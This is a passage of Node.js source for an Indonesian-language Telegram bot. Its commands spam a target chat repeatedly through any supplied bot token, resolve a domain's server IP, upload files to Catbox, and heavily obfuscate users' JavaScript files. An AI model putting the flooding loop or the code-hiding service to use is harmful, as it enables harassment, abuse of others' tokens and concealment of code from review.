      "<code>/message token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/message 123456:ABCDEF|987654321|Halo bro|5</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    const [token, targetId, pesan, jumlahStr] = input.split("|").map(x => x.trim());
    const jumlah = parseInt(jumlahStr);

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return bot.sendMessage(chatId,
        "❌ Format salah!\nGunakan: <code>/message token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      );
    }

    await bot.sendMessage(chatId, "🚀 Mengirim pesan...");
    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    bot.sendMessage(chatId, `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`, {
      parse_mode: "HTML"
    });

  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`, {
      parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/cekip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  let target = match[1]?.trim();

  if (!target) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\nContoh:\n/cekip google.com\n/cekip https://google.com\nGUNAKAN FORMAT http:// atau https://"
    );
  }
  
  try {
    if (!target.startsWith("http://") && !target.startsWith("https://")) {
      target = "http://" + target;
    }
    target = new URL(target).hostname;
  } catch (e) {
    return bot.sendMessage(chatId, "❌ URL tidak valid");
  }

  const sent = await bot.sendMessage(chatId, "⏳ Proses cek IPVPS...");

  dns.lookup(target, (err, address) => {
    if (err) {
      return bot.editMessageText(
`❌ *GAGAL CEK IP*
TARGET : \`${target}\`
INFO   : Tidak dapat resolve IP`,
        {
          chat_id: chatId,
          message_id: sent.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    bot.editMessageText(
`✅ *HASIL CEK IP*
DOMAIN : \`${target}\`
IPVPS  : \`${address}\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown",
      }
    );
  });
});

bot.onText(/\/tourl/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id; 
  const member = await bot.getChatMember(GROUP_ID, userId);
    if (member.status === 'left' || member.status === 'kicked') {
      return bot.sendMessage(chatId, `<blockquote>🚫 Kamu harus join channel official dulu supaya bisa pakai fitur ini.</blockquote>`, {
      parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "📡 Channel", url: "https://t.me/newsnuxx", style: "primary" }]] }
      });
    }
    
  const replyMsg = msg.reply_to_message;
  if (!replyMsg) {
    return bot.sendMessage(chatId, `<blockquote>❌ Balas sebuah pesan yang berisi file/audio/video dengan perintah /tourl.</blockquote>`, {
    parse_mode: "HTML"
  });
  }

  if (!replyMsg.document && !replyMsg.photo && !replyMsg.video && !replyMsg.audio && !replyMsg.voice) {
    return bot.sendMessage(chatId,`<blockquote>❌ Pesan yang kamu balas tidak mengandung file/audio/video yang bisa diupload.</blockquote>`, {
    parse_mode: "HTML"
  });
  }

  try {
    let fileId, filename;

    if (replyMsg.document) {
      fileId = replyMsg.document.file_id;
      filename = replyMsg.document.file_name;
    } else if (replyMsg.photo) {
      const photoArray = replyMsg.photo;
      fileId = photoArray[photoArray.length - 1].file_id;
      filename = 'photo.jpg';
    } else if (replyMsg.video) {
      fileId = replyMsg.video.file_id;
      filename = replyMsg.video.file_name || 'video.mp4';
    } else if (replyMsg.audio) {
      fileId = replyMsg.audio.file_id;
      filename = replyMsg.audio.file_name || 'audio.mp3';
    } else if (replyMsg.voice) {
      fileId = replyMsg.voice.file_id;
      filename = 'voice.ogg';
    }

    const fileLink = await bot.getFileLink(fileId);
    const response = await fetch(fileLink);
    const fileBuffer = Buffer.from(await response.arrayBuffer());

    const catboxUrl = await uploadToCatbox(fileBuffer, filename);

    bot.sendMessage(chatId, `<blockquote>✅ File berhasil diupload ke Catbox:\n${catboxUrl}</blockquote>`, {
    parse_mode: "HTML"
  });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `<blockquote>❌ Gagal upload file: ${err.message}</blockquote>`, {
    parse_mode: "HTML"
  });
  }
});
// ---------- ( Case Obfuscation ) ---------- //
bot.onText(/^\/encnew$/, async (msg) => {
    const chatId = msg.chat.id

    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "❌ Reply file .js dengan perintah ini")
    }

    const file = msg.reply_to_message.document
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "❌ Hanya file .js yang didukung")
    }

    const newPath = path.join(
        __dirname,
        `new-${file.file_name}`
    )

    let progressMessage

    try {
        progressMessage = await bot.sendMessage(
            chatId,
            "```All Team Nuxx\n" +
            "🔒 Starting EncryptBot\n" +
            " ⚙️ Memulai (Hardened Advanced) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```",
            { parse_mode: "Markdown" }
        )

        const fileLink = await bot.getFileLink(file.file_id)
        await updateProgress(bot, chatId, progressMessage.message_id, 10, "Mengunduh")

        const response = await fetch(fileLink)
        const fileContent = await response.text()

        await updateProgress(bot, chatId, progressMessage.message_id, 30, "Validasi Kode")
        new Function(fileContent)

        await updateProgress(bot, chatId, progressMessage.message_id, 50, "Advanced Obfuscation")
        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getNewObfuscationConfig()
        )

        const encryptedCode = obfuscated.code || obfuscated
        if (typeof encryptedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string")
        }

        await updateProgress(bot, chatId, progressMessage.message_id, 60, "Validasi Hasil")
        new Function(encryptedCode)

        await updateProgress(bot, chatId, progressMessage.message_id, 80, "Finalisasi")
        await fs.writeFile(newPath, encryptedCode)

        await bot.sendDocument(chatId, newPath, {
            reply_to_message_id: msg.message_id,
            filename: `new-${file.file_name}`
        })

        await updateProgress(bot, chatId, progressMessage.message_id, 100, "Selesai")

        await bot.deleteMessage(chatId, progressMessage.message_id)
        await fs.unlink(newPath)

    } catch (err) {
        if (progressMessage?.message_id) {
            try { await bot.deleteMessage(chatId, progressMessage.message_id) } catch {}
        }

        if (await fs.pathExists(newPath)) {
            await fs.unlink(newPath)
        }

        await bot.sendMessage(
            chatId,
            `❌ ${err.message || "Terjadi kesalahan"}`,
            { parse_mode: "Markdown" }
        )
    }
})

bot.onText(/^\/encultra$/, async (msg) => {
    const chatId = msg.chat.id

    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "❌ Reply file .js dengan perintah ini")
    }

    const file = msg.reply_to_message.document
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "❌ Hanya file .js yang didukung")
    }

    const ultraPath = path.join(
        __dirname,
        `ultra-${file.file_name}`
    )

    let progressMessage

    try {
        progressMessage = await bot.sendMessage(
            chatId,
            "```All Team Nuxx\n" +
            "🔒 Starting EncryptBot\n" +
            " ⚙️ Memulai (Hardened Ultra) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```",
            { parse_mode: "Markdown" }
        )

        const fileLink = await bot.getFileLink(file.file_id)
        await updateProgress(bot, chatId, progressMessage.message_id, 10, "Mengunduh")

        const response = await fetch(fileLink)
        const fileContent = await response.text()

        await updateProgress(bot, chatId, progressMessage.message_id, 30, "Validasi Kode")
        new Function(fileContent)

        await updateProgress(bot, chatId, progressMessage.message_id, 50, "Ultra Obfuscation")
        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getUltraObfuscationConfig()
        )

        const encryptedCode = obfuscated.code || obfuscated
        if (typeof encryptedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string")
        }

        await updateProgress(bot, chatId, progressMessage.message_id, 60, "Validasi Hasil")
        new Function(encryptedCode)

        await updateProgress(bot, chatId, progressMessage.message_id, 80, "Finalisasi")
        await fs.writeFile(ultraPath, encryptedCode)

        await bot.sendDocument(chatId, ultraPath, {
            reply_to_message_id: msg.message_id,
            filename: `ultra-${file.file_name}`
        })

        await updateProgress(bot, chatId, progressMessage.message_id, 100, "Selesai")

        await bot.deleteMessage(chatId, progressMessage.message_id)
        await fs.unlink(ultraPath)

    } catch (err) {
        if (progressMessage?.message_id) {
            try { await bot.deleteMessage(chatId, progressMessage.message_id) } catch {}
        }

        if (await fs.pathExists(ultraPath)) {
            await fs.unlink(ultraPath)
        }

        await bot.sendMessage(
            chatId,
            `❌ ${err.message || "Terjadi kesalahan"}`,
            { parse_mode: "Markdown" }
        )
    }
})

bot.onText(/^\/encquantum$/, async (msg) => {
    const chatId = msg.chat.id

    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "❌ Reply file .js dengan perintah ini")
    }

    const file = msg.reply_to_message.document
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "❌ Hanya file .js yang didukung")
    }

    const quantumPath = path.join(
        __dirname,
        `quantum-${file.file_name}`
    )

    let progressMessage

    try {
        progressMessage = await bot.sendMessage(
            chatId,
            "```All Team Nuxx\n" +
            "🔒 Starting EncryptBot\n" +
            " ⚙️ Memulai (Quantum Vortex Encryption) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```",
            { parse_mode: "Markdown" }
        )

        const fileLink = await bot.getFileLink(file.file_id)
        await updateProgress(bot, chatId, progressMessage.message_id, 10, "Mengunduh")

        const response = await fetch(fileLink)
        const fileContent = await response.text()

        await updateProgress(bot, chatId, progressMessage.message_id, 30, "Validasi Kode")
        new Function(fileContent)

        await updateProgress(bot, chatId, progressMessage.message_id, 50, "Quantum Obfuscation")
        const encryptedCode = await obfuscateQuantum(fileContent)

        await updateProgress(bot, chatId, progressMessage.message_id, 60, "Validasi Hasil")
        new Function(encryptedCode)

        await updateProgress(bot, chatId, progressMessage.message_id, 80, "Finalisasi")
        await fs.writeFile(quantumPath, encryptedCode)

        await bot.sendDocument(chatId, quantumPath, {
            reply_to_message_id: msg.message_id,
            filename: `quantum-${file.file_name}`
        })

        await updateProgress(bot, chatId, progressMessage.message_id, 100, "Selesai")

        await bot.deleteMessage(chatId, progressMessage.message_id)
        await fs.unlink(quantumPath)

    } catch (err) {
        if (progressMessage?.message_id) {
            try { await bot.deleteMessage(chatId, progressMessage.message_id) } catch {}
        }

        if (await fs.pathExists(quantumPath)) {
            await fs.unlink(quantumPath)
        }

        await bot.sendMessage(
            chatId,
            `❌ ${err.message || "Terjadi kesalahan"}`,
            { parse_mode: "Markdown" }
        )
    }
})

bot.onText(/^\/encnuxx$/, async (msg) => {
    const chatId = msg.chat.id;

    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(
            chatId,
            "❌ *Error:* Balas file .js dengan `/encnuxx`!",
            { parse_mode: "Markdown" }
        );
    }

    const file = msg.reply_to_message.document;

    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(
            chatId,
            "❌ *Error:* Hanya file .js yang didukung!",
            { parse_mode: "Markdown" }
        );
    }

    const encryptedPath = path.join(__dirname, `nova-encrypted-${file.file_name}`);
    let progressMessage;

    try {
        progressMessage = await bot.sendMessage(
            chatId,
            "```All Team Nuxx\n" +
            "🔒 Starting Encrypted...\n" +
            " ⚙️ Memulai (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```",
            { parse_mode: "Markdown" }
        );

        const fileLink = await bot.getFileLink(file.file_id);
        await updateProgress(bot, chatId, progressMessage.message_id, 10, "Mengunduh");

        const response = await fetch(fileLink);
        const fileContent = await response.text();
        await updateProgress(bot, chatId, progressMessage.message_id, 20, "Unduhan Selesai");

        await updateProgress(bot, chatId, progressMessage.message_id, 30, "Validasi Kode");
        new Function(fileContent);

        await updateProgress(bot, chatId, progressMessage.message_id, 40, "Inisialisasi Nova");

        const obfuscated = await JsConfuser.obfuscate(
            fileContent,
            getNovaObfuscationConfig()
        );

        const obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        await updateProgress(bot, chatId, progressMessage.message_id, 60, "Transformasi Kode");
        new Function(obfuscatedCode);

        await updateProgress(bot, chatId, progressMessage.message_id, 80, "Finalisasi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        await bot.sendDocument(chatId, encryptedPath, {
            reply_to_message_id: msg.message_id,
            filename: `nova-enc-${file.file_name}`
        });

        await updateProgress(bot, chatId, progressMessage.message_id, 100, "Selesai");

        await bot.deleteMessage(chatId, progressMessage.message_id);
        await fs.unlink(encryptedPath);

    } catch (err) {
        if (progressMessage?.message_id) {
            try { await bot.deleteMessage(chatId, progressMessage.message_id); } catch {}
        }

        await bot.sendMessage(
            chatId,
            `❌ ${err.message}`,
            { parse_mode: "Markdown" }
        );

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
        }
    }
});